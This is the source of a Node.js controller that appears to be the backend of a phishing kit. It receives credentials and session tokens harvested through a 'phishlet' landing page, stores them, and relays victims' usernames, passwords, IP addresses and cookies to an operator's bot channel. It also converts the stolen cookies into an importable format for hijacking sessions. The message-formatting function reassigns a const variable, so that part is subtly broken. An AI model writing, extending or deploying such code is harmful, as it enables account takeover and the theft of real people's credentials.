const sessionService = require("../service/session");
const lureService = require("../service/lure");
const bot = require("../service/bot");

const resolve = (data, res) =>
  res.status(200).send({
    success: true,
    data,
  });

const reject = (err, res) => {
  console.log("User Service Error:", err);
  return res.status(500).send({
    success: false,
    message: err?.response?.data?.errorDescription || "Some error occurred",
  });
};

exports.create = (req, res) => {
  console.log(req.body);
  const {
    phishlet,
    landing_url,
    username,
    password,
    body_tokens,
    http_tokens,
    tokens,
    session_id,
    useragent,
    remote_addr,
  } = req.body;
  sessionService
    .create({
      phishlet,
      landingUrl: landing_url,
      username,
      password,
      bodyToken: JSON.stringify(body_tokens),
      httpToken: JSON.stringify(http_tokens),
      cookieToken: cookieToString(tokens),
      sessionId: session_id,
      userAgent: useragent,
      remoteAddr: remote_addr,
    })
    .then((data) => {
      lureService
        .findOne({ landingUrl: data.landingUrl })
        .then((lure) => {
          try {
            data = data.toJSON();
            delete data.id;
            delete data.phishlet;
            delete data.updatedAt;
            bot.sendMessage(lure.channel, getFormattedMsg(data));
            resolve({}, res);
          } catch (err) {
            reject(err, res);
          }
        })
        .catch((err) => reject(err, res));
    })
    .catch((err) => reject(err, res));
};

exports.delete = (req, res) => {
  sessionService
    .remove(req.body.id)
    .then((data) => resolve(data, res))
    .catch((err) => reject(err, res));
};

const getFormattedMsg = (data) => {
  const msg = "";
  msg += `Phishing Url: ${data.landingUrl}\n`;
  msg += `Username: ${data.username}\n`;
  msg += `Password: ${data.password}\n`;
  msg += `UserAgent: ${data.userAgent}\n`;
  msg += `Remote Address: ${data.remoteAddr}\n`;
  msg += `Time: ${data.createdAt}\n\nCookiToken\n`;
  msg += `${data.cookieToken}\n`;
  return msg;
};

const cookieToString = (tokens) => {
  const cookies = [];

  // eslint-disable-next-line no-restricted-syntax
  for (const domain in tokens) {
    for (const key in tokens[domain]) {
      const token = tokens[domain][key];

      const expirationDate =
        Math.floor(new Date().getTime() / 1000) + 365 * 24 * 60 * 60; // 1 year in seconds

      const cookie = {
        path: token.Path,
        domain,
        expirationDate,
        value: token.Value,
        name: key,
        httpOnly: token.HttpOnly,
      };

      if (domain[0] === ".") {
        cookie.domain = domain.slice(1);
      } else {
        cookie.hostOnly = true;
      }
      if (cookie.path == "") {
        cookie.path = "/";
      }
      cookies.push(cookie);
    }
  }
  return JSON.stringify(cookies);
};
